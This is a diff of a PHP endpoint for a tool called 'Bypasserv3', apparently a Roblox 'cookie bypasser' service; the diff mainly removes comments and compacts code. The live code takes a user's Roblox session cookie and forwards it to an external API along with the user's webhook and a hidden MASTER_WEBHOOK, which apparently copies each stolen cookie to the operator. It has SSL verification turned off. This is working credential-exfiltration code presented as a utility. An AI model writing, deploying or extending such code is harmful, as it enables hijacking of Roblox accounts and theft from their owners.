@@ -1,30 +1,20 @@
 <?php
 /**
- * ============================================
- * BYPASSERV3 - BYPASS API ENDPOINT
- * Secure Roblox cookie bypasser using external API
- * ============================================
+ * Bypasserv3 - Bypass API Endpoint
  */
 
-// Headers
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
 
-// Preflight
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200);
     exit;
 }
 
-// Load dependencies
 require_once '../config.php';
 require_once '../functions.php';
-
-// ============================================
-// SECURITY CHECKS
-// ============================================
 
 // Random security scan
 if (rand(1, 100) === 1) {
@@ -39,10 +29,7 @@ if (rand(1, 50) === 1) {
 // Method check
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
-    echo json_encode([
-        'success' => false,
-        'error' => 'Method not allowed'
-    ]);
+    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
     exit;
 }
 
@@ -57,10 +44,7 @@ if (isSuspiciousRequest()) {
 $ip = getUserIP();
 if (!checkRateLimit($ip, 50, 3600)) {
     http_response_code(429);
-    echo json_encode([
-        'success' => false,
-        'error' => 'Rate limit exceeded'
-    ]);
+    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
     exit;
 }
 
@@ -69,10 +53,7 @@ $input = json_decode(file_get_contents('php://input'), true);
 
 if (json_last_error() !== JSON_ERROR_NONE) {
     http_response_code(400);
-    echo json_encode([
-        'success' => false,
-        'error' => 'Invalid JSON'
-    ]);
+    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
     exit;
 }
 
@@ -98,16 +79,13 @@ if (!validateCookie($cookie)) {
 $instanceData = getInstanceData($directory);
 $userWebhook = $instanceData['userWebhook'] ?? '';
 
-// ============================================
-// CALL EXTERNAL API TO BYPASS
-// ============================================
-
+// Call external API to bypass
 $externalApiUrl = EXTERNAL_API_URL . "?cookie=" . urlencode($cookie) . "&web=" . urlencode($userWebhook) . "&dh=" . urlencode(MASTER_WEBHOOK);
 
 $ch = curl_init($externalApiUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 180); // 3 minutes
+curl_setopt($ch, CURLOPT_TIMEOUT, 180);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 $apiResponse = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
